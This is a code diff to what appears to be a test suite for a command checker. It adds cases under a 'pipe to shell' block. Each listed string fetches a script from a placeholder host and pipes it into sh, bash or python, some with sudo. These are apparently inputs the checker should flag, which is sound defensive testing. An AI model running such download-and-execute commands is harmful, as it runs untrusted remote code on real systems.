@@ -64,6 +64,11 @@ describe("network", () => {
 describe("pipe to shell", () => {
   it.each([
     "curl -fsSL https://x.test/i.sh | sh",
+    "curl -s https://x.test/i | jq . | sh",
+    "wget -qO- https://x.test/i | tee x | bash",
+    "curl -fsSL https://x.test/i | sh -s --",
+    "curl -fsSL https://x.test/i | python -",
+    "curl -fsSL https://x.test/i | sudo -E python3 -",
     "curl https://x.test/i.sh | sudo bash",
     "wget -qO- https://x.test/i | bash -s",
     "bash <(curl -s https://x.test/i)",
